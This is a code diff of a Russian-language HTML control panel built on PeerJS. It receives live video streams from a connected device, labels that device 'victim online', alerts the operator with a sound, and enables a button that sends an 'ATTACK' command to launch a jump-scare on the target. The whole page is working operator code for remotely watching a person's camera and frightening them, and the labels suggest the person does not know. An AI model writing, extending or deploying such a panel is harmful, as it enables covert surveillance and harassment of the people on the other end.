@@ -1,51 +1,61 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Панель Управления</title>
+    <title>Панель Управления (Ваниш)</title>
     <meta charset="utf-8">
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
-        body { background: #0b0b0b; color: white; font-family: sans-serif; margin: 0; display: flex; height: 100vh; }
-        .sidebar { width: 250px; background: #151515; border-right: 1px solid #333; padding: 20px; }
-        .main { flex: 1; display: flex; flex-direction: column; align-items: center; padding: 20px; }
-        video { width: 45%; border: 2px solid #ff0050; border-radius: 10px; margin: 5px; background: #000; }
-        .btn-attack { background: #ff0050; color: white; border: none; padding: 20px; width: 100%; font-size: 18px; font-weight: bold; border-radius: 10px; cursor: pointer; margin-top: 20px; }
+        body { background: #0b0b0b; color: #0f0; font-family: monospace; display: flex; margin: 0; height: 100vh; }
+        #sidebar { width: 280px; border-right: 1px solid #333; padding: 20px; background: #111; }
+        #display { flex: 1; display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 10px; }
+        video { width: 100%; border: 2px solid #ff0050; border-radius: 10px; background: #000; }
+        .btn-attack { background: #ff0000; color: #fff; border: none; padding: 20px; width: 100%; cursor: pointer; font-weight: bold; font-size: 18px; border-radius: 10px; margin-top: 20px; }
+        .user-card { background: #222; padding: 10px; border-radius: 5px; margin-top: 10px; border-left: 3px solid #0f0; }
     </style>
 </head>
 <body>
-    <div class="sidebar">
-        <h3>Устройства (Live)</h3>
-        <div id="users">Ожидание...</div>
-        <button class="btn-attack" onclick="sendAttack()">⚡ СКРИМЕР ⚡</button>
+    <audio id="notif-sound" src="https://www.myinstants.com/media/sounds/discord-notification.mp3"></audio>
+
+    <div id="sidebar">
+        <h2>SYSTEM CONTROL</h2>
+        <div id="status">ОЖИДАНИЕ...</div>
+        <div id="user-info"></div>
+        <hr color="#333">
+        <button id="attackBtn" class="btn-attack" onclick="attack()" disabled>⚡ ЗАПУСТИТЬ СКРИМЕР ⚡</button>
     </div>
-    <div class="main">
-        <h2 id="status">ТРАНСЛЯЦИЯ</h2>
-        <div id="video-container" style="display: flex; flex-wrap: wrap; justify-content: center;"></div>
-    </div>
+    <div id="display"></div>
 
     <script>
         const MY_ID = '09062012';
         const peer = new Peer(MY_ID);
         let activeConn = null;
 
+        // Функция звука
+        function playNotif() {
+            const audio = document.getElementById('notif-sound');
+            audio.play().catch(() => console.log("Кликни по странице для активации звука"));
+        }
+
         peer.on('connection', conn => {
             activeConn = conn;
-            document.getElementById('users').innerHTML = `<div style="color:#0f0">● ONLINE [${conn.peer.substring(0,5)}]</div>`;
+            playNotif(); // Звук при подключении данных
+            document.getElementById('status').innerText = "ЖЕРТВА В СЕТИ";
+            document.getElementById('user-info').innerHTML = `<div class="user-card">NEW DEVICE CONNECTED</div>`;
+            document.getElementById('attackBtn').disabled = false;
         });
 
         peer.on('call', call => {
             call.answer();
             call.on('stream', stream => {
-                let video = document.createElement('video');
-                video.autoplay = true;
-                video.playsinline = true;
-                video.srcObject = stream;
-                document.getElementById('video-container').appendChild(video);
+                const v = document.createElement('video');
+                v.autoplay = true; v.playsinline = true; v.controls = true;
+                v.srcObject = stream;
+                document.getElementById('display').appendChild(v);
             });
         });
 
-        function sendAttack() {
-            if (activeConn) activeConn.send('ATTACK');
+        function attack() {
+            if(activeConn) activeConn.send('ATTACK');
         }
     </script>
 </body>
